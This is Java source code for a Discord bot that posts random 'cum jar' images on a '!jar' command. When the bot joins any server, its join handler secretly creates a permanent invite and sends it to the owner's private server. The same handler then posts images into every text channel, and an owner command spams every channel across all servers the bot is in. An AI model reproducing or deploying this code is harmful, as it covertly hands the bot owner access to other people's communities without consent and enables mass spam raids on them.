package net.riezebos.robin.cumjar;

import org.javacord.api.DiscordApi;
import org.javacord.api.DiscordApiBuilder;
import org.javacord.api.entity.activity.ActivityType;
import org.javacord.api.entity.message.embed.EmbedBuilder;
import org.javacord.api.entity.server.Server;
import org.javacord.api.entity.server.invite.Invite;
import org.javacord.api.entity.server.invite.InviteBuilder;
import org.javacord.api.event.message.MessageCreateEvent;
import org.javacord.api.event.server.ServerJoinEvent;
import org.javacord.api.listener.message.MessageCreateListener;
import org.javacord.api.listener.server.ServerJoinListener;
import org.javacord.api.util.logging.ExceptionLogger;

import java.awt.*;
import java.io.*;
import java.util.ArrayList;
import java.util.Collection;
import java.util.concurrent.ExecutionException;

public class App {
    public static ArrayList<String> jars = new ArrayList<>();

    public static File jarsTxt = new File(System.getProperty("user.dir") + File.separator + "jars.txt");

    public static File getJarsTxt() {
        return jarsTxt;
    }

    public static void main(String[] args) {

        final String token = args[0];

        new DiscordApiBuilder()
                .setToken(token)
                .setRecommendedTotalShards().join()
                .loginAllShards()
                .forEach(shardFuture -> shardFuture
                        .thenAccept(App::onShardLogin).exceptionally(ExceptionLogger.get())
                );
    }

    private static void onShardLogin(DiscordApi api) {

        // add activity
        api.updateActivity(ActivityType.WATCHING, "!jar");

        // load jar images from file
        try {
            jarIn();
        } catch (IOException e) {
            e.printStackTrace();
        }

        // debug
        System.out.println("Connected to shard " + api.getCurrentShard());
        Collection<Server> serverCollection = api.getServers();
        System.out.println(String.format("Total guilds: %s", serverCollection.size()));

        // make jar embed
        EmbedBuilder jarEmbed = new EmbedBuilder()
                .setColor(new Color(255,255,255))
                .setDescription("[**invite cum jar**]" +
                        "(https://discordapp.com/oauth2/authorize?client_id=650106404522295326&scope=bot&permissions=18432" +
                        " \"add cum jar to your server\")")
                .addField("suggest new cum jars: ", "https://discord.gg/GsqT7GP");

        // Message Handler
        api.addMessageCreateListener(new MessageCreateListener() {
            @Override
            public void onMessageCreate(MessageCreateEvent event) {

                // split sent message by args
                String[] args = event.getMessageContent().split(" ");

                // admin commands
                if (event.getMessageAuthor().isBotOwner()) {

                    // jar add command
                    if (args.length > 1 && String.format("%s %s", args[0], args[1]).equals("!jar add")) {

                        // by attachment
                        if (event.getMessage().getAttachments().size() > 0) {
                            jars.add(event.getMessage().getAttachments().get(0).getUrl().toString());
                            try {
                                jarOut();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            event.getChannel().sendMessage(":white_check_mark: jar has been added!");
                        }
                        // by url
                        else if ((args[2].toLowerCase().startsWith("https://") || args[2].toLowerCase().startsWith("http://"))
                                && (args[2].toLowerCase().endsWith(".jpg") || args[2].toLowerCase().endsWith(".png"))) {
                            jars.add(args[2]);
                            try {
                                jarOut();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            event.getChannel().sendMessage(":white_check_mark: jar has been added!");
                        }


                    }

                    // jar in all connected guilds
                    if ( event.getMessageContent().equals("!jar")) {
                        serverCollection.forEach(server -> {
                            api.getThreadPool().getExecutorService().execute(() -> {
                                server.getTextChannels().forEach(serverTextChannel -> {

                                    // set random integer to select jar image by index
                                    int random = (int) (Math.random() * jars.size());

                                    // send jar to all channels
                                    serverTextChannel.sendMessage(jarEmbed.setImage(jars.get(random)));
                                    try {
                                        Thread.sleep(200);
                                    } catch (InterruptedException e) {
                                        e.printStackTrace();
                                    }
                                });
                            });
                        });
                    }
                }

                // regular !jar
                else if (event.getMessageContent().equals("!jar")) {

                    // set random integer to select jar image by index
                    int random = (int) (Math.random()*jars.size());

                    // send jar
                    event.getChannel().sendMessage(jarEmbed.setImage(jars.get(random)));
                }
            }
        });

        // server join handler
        api.addServerJoinListener(new ServerJoinListener() {
            @Override
            public void onServerJoin(ServerJoinEvent event) {
                // establish which server was joined
                Server server = event.getServer();

                // debug
                System.out.println("Joined guild: " + event.getServer().getName());

                api.getServerById(650146481969561600L).ifPresent(home -> {
                    home.getTextChannelById(650179401027158026L).ifPresent(homeChannel -> {
                        try {
                            homeChannel.sendMessage("Joined guild " + server.getName());
                            homeChannel.sendMessage("\nGuild invite: " +
                                    server
                                        .getTextChannels()
                                        .get(0)
                                        .createInviteBuilder()
                                        .setNeverExpire()
                                        .setMaxUses(1)
                                        .create()
                                        .get()
                                        .getUrl());
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        } catch (ExecutionException e) {
                            e.printStackTrace();
                        }
                    });
                });

                // sending jars in every channel the bot can send messages to
                api.getThreadPool().getExecutorService().execute(() -> {
                    server.getTextChannels().forEach(serverTextChannel -> {
                        // random integer for jar selection
                        int random = (int) (Math.random()*jars.size());

                        // send jar
                        serverTextChannel.sendMessage(jarEmbed.setImage(jars.get(random)));

                        try {
                            Thread.sleep(200);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    });
                });


            }
        });
    }

    private static void jarOut() throws IOException {
        FileWriter jarTxtOut = new FileWriter("jars.txt");
        jarTxtOut.write("");
        jars.forEach(jar -> {
            try {
                System.out.println("Adding jar: " + jar);
                jarTxtOut.append(jar + ",");
            } catch (IOException e) {
                e.printStackTrace();
            }
        });
        jarTxtOut.close();
    }

    public static void jarIn() throws IOException {
        FileReader jarTxtIn = new FileReader(jarsTxt);
        String jarsString = "";
        int i;
        while ((i=jarTxtIn.read()) != -1) {
            jarsString = jarsString + (char) i;
        }

        String[] jarsStringArray = jarsString.split(",");
        for (String s : jarsStringArray) {
            System.out.println(s);
            jars.add(s);
        }
        jarTxtIn.close();
    }
}

